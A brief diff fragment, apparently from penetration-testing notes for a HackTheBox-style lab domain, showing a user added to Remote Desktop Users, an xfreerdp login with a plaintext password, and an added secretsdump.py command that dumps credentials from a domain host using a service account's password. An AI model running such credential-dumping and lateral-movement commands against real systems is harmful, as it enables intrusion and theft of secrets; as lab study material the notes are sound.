@@ -19,3 +19,9 @@ Add-LocalGroupMember -Group "Remote Desktop Users" -Member "riley"
 ----
 
 xfreerdp /u:riley /p:P@ssw0rd /d:painters.htb /v:192.168.110.56 /cert:ignore
+
+
+
+secretsdump.py painters.htb/web_svc:'!QAZ1qaz'@192.168.110.52
+
+
